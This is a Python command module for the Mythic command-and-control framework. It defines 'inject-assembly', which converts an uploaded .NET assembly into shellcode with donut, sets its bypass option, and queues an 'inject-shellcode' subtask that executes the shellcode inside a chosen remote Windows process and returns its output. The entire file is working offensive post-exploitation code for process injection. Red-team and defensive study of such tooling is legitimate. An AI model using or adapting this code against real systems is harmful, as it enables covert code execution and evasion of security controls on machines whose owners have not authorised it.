from mythic_container.MythicCommandBase import *  # import the basics
import json  # import any other code you might need
# import the code for interacting with Files on the Mythic server
from mythic_container.MythicRPC import *
import donut
import tempfile
import base64
import os

# create a class that extends TaskArguments class that will supply all the arguments needed for this command
class InjectAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        # this is the part where you'd add in your additional tasking parameters
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="",
                parameter_group_info=[ParameterGroupInfo(ui_position=1)],
            ),
            # CommandParameter(
            #     name="processID",
            #     type=ParameterType.String,
            #     description="",
            #     parameter_group_info=[ParameterGroupInfo(ui_position=2)],
            # ),
            CommandParameter(
                name="processName",
                type=ParameterType.String,
                description="",
                parameter_group_info=[ParameterGroupInfo(ui_position=2)],
            ),
            CommandParameter(
                name="arguments",
                type=ParameterType.String,
                description="Arguments that are passed to the assembly",
                parameter_group_info=[ParameterGroupInfo(ui_position=2)],
            ),
            CommandParameter(
                name="output",
                type=ParameterType.Boolean,
                description="Get assembly output",
                parameter_group_info=[ParameterGroupInfo(ui_position=2)],
            )
        ]

    # you must implement this function so that you can parse out user typed input into your paramters or load your parameters based on some JSON input
    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)


# this is information about the command itself
class InjectAssemblyCommand(CommandBase):
    cmd = "inject-assembly"
    needs_admin = False
    help_cmd = "inject-assembly"
    description = "Use donut to convert a .NET assembly into shellcode and execute the buffer in a remote process"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = ""
    argument_class = InjectAssemblyArguments
    attackmapping = []
    browser_script = None
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=True
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        #Get original file info
        fData = FileData()
        fData.AgentFileId = task.args.get_arg("file")
        file_rpc = await SendMythicRPCFileGetContent(fData)
        
        if not file_rpc.Success:
            raise Exception("Failed to get file contents: " + file_rpc.Error)

        #Create a temporary file
        tempDir = tempfile.TemporaryDirectory()

        with open(os.path.join(tempDir.name, "assembly.exe"), "wb") as file:
            file.write(file_rpc.Content)

        shellcode = donut.create(
            file=os.path.join(tempDir.name, "assembly.exe"),
            arch=3,
            bypass=3,
            params = task.args.get_arg("arguments"),
            exit_opt = 2,
        )

        fileCreate = MythicRPCFileCreateMessage(task.id, DeleteAfterFetch = True, FileContents = shellcode, Filename = "shellcode.bin")

        # fileCreate.FileContents = shellcode
        # fileCreate.Filename = "shellcode.bin"
        # fileCreate.TaskID = task.id
        # fileCreate.DeleteAfterFetch = True

        shellcodeFile = await SendMythicRPCFileCreate(fileCreate)
        
        if shellcodeFile.Success:
            resp = await MythicRPC().execute("create_subtask_group", tasks=[
                {"command": "inject-shellcode", "params": {"file": shellcodeFile.AgentFileId, "processName":task.args.get_arg("processName"),"output": str(task.args.get_arg("output"))}},
                ], 
                subtask_group_name = "inject-shellcode", parent_task_id=task.id)



            # createSubtaskMessage = MythicRPCTaskCreateSubtaskMessage()
            # createSubtaskMessage.TaskID = task.id
            # createSubtaskMessage.CommandName = "inject-shellcode"
            # createSubtaskMessage.Params = "{\"file\":\"" + shellcodeFile.AgentFileId + "\", \"processName\":\"" + task.args.get_arg("processName") + "\", \"output\":\"" + str(task.args.get_arg("output")) + "\"}"
            # createSubtaskMessage.Token = task.token
            # await SendMythicRPCTaskCreateSubtask(createSubtaskMessage)
        else:
            raise Exception("Error from Mythic trying to run task: " + shellcodeFile.Error)

        return task

    async def process_response(self, response: AgentResponse):
        pass

